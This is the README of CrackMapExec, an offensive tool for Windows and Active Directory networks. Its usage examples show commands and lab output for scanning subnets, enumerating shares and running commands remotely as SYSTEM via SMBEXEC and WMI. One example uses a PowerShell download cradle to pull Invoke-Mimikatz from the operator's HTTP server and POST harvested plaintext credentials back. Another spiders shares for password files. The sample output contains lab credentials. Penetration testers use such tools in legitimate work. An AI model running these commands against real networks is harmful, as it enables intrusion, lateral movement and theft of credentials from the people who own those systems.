# CrackMapExec
A swiss army knife for pentesting Windows/Active Directory environments

Powered by [Impacket](https://github.com/CoreSecurity/impacket) 

This project was inspired by/based off of: 
- @ShawnDEvans's [smbmap](https://github.com/ShawnDEvans/smbmap)
- @gojhonny's [CredCrack](https://github.com/gojhonny/CredCrack)
- @pentestgeek's [smbexec](https://github.com/pentestgeek/smbexec)

Additionally some code was stolen from @T-S-A's [smbspider](https://github.com/T-S-A/smbspider) script

#Description

CrackMapExec is your one-stop-shop for pentesting Windows/Active Directory environments!

From enumerating logged on users and spidering SMB shares to executing psexec style attacks and auto-injecting Mimikatz into memory using Powershell!

The biggest improvements over the above tools are:
- Pure Python script, no external tools required
- Fully concurrent threading
- Uses **ONLY** native WinAPI calls for discovering sessions, users, dumping SAM hashes etc...
- Opsec safe (no binaries are uploaded to dump clear-text credentials)

#Usage examples

The most basic usage: scans the subnet using 100 concurrent threads:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
```

Let's enumerate available shares:
```
#~  python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --shares
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Available shares:
	SHARE			Permissions
	-----			-----------
	ADMIN$			READ, WRITE
	IPC$			NO ACCESS
	C$			    READ, WRITE
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Available shares:
	SHARE			Permissions
	-----			-----------
	Users			READ, WRITE
	ADMIN$			READ, WRITE
	IPC$			NO ACCESS
	C$			    READ, WRITE
[+] 172.16.206.132:445 DRUGCOMPANY-PC Available shares:
	SHARE			Permissions
	-----			-----------
	Users			READ, WRITE
	ADMIN$			READ, WRITE
	IPC$			NO ACCESS
	C$			    READ, WRITE
```

Let's execute some commands on all systems concurrently:

```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password -x whoami
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
nt authority\system

[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
nt authority\system

[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
nt authority\system
```

Same as above only using WMI as the code execution method:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --execm wmi -x whoami
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via WMI
drugcompany-pc\administrator

[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via WMI
drugoutcove-pc\administrator

[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via WMI
desktop-qdvnp6b\drugdealer
```

Use an IEX cradle to run Invoke-Mimikatz.ps1 on all systems concurrently (PS script gets hosted automatically with an HTTP server),
Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file and parsed for clear-text credentials:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --mimikatz
[*] Press CTRL-C at any time to exit
[*] Note: This might take some time on large networks! Go grab a redbull!
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
172.16.206.130 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.133 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.132 - - [19/Aug/2015 18:57:41] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.133 - - [19/Aug/2015 18:57:45] "POST / HTTP/1.1" 200 -
[+] 172.16.206.133 Found plain text creds! Domain: drugoutcove-pc Username: drugdealer Password: IloveMETH!@$
[*] 172.16.206.133 Saved POST data to Mimikatz-172.16.206.133-2015-08-19_18:57:45.log
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
172.16.206.130 - - [19/Aug/2015 18:57:47] "POST / HTTP/1.1" 200 -
[*] 172.16.206.130 Saved POST data to Mimikatz-172.16.206.130-2015-08-19_18:57:47.log
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
172.16.206.132 - - [19/Aug/2015 18:57:48] "POST / HTTP/1.1" 200 -
[+] 172.16.206.132 Found plain text creds! Domain: drugcompany-PC Username: drugcompany Password: IloveWEED!@#
[+] 172.16.206.132 Found plain text creds! Domain: DRUGCOMPANY-PC Username: drugdealer Password: D0ntDoDrugsKIDS!@#
[*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
``` 

Lets Spider the C$ share starting from the Users folder for the word 'password' in all files and directories (concurrently):
```
#~ python crackmapexec.py -t 150 172.16.206.0/24 -u 'Administrator' -p 'crackmeumofo' --spider Users --depth 10 --pattern password
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.132:445 DRUGCOMPANY-PC Started spidering
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Started spidering
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Started spidering
//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecrepasswords.lnk
//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecretpasswords.lnk
//172.16.206.132/Users/drugcompany/Desktop/supersecretpasswords.txt
[+] 172.16.206.132:445 DRUGCOMPANY-PC Done spidering (Completed in 7.0349509716)
//172.16.206.133/Users/drugdealerboss/Documents/omgallthepasswords.txt
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Done spidering (Completed in 16.2127850056)
//172.16.206.130/Users/drugdealer/AppData/Roaming/Microsoft/Windows/Recent/superpasswords.txt.lnk
//172.16.206.130/Users/drugdealer/Desktop/superpasswords.txt.txt
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Done spidering (Completed in 38.6000130177)
```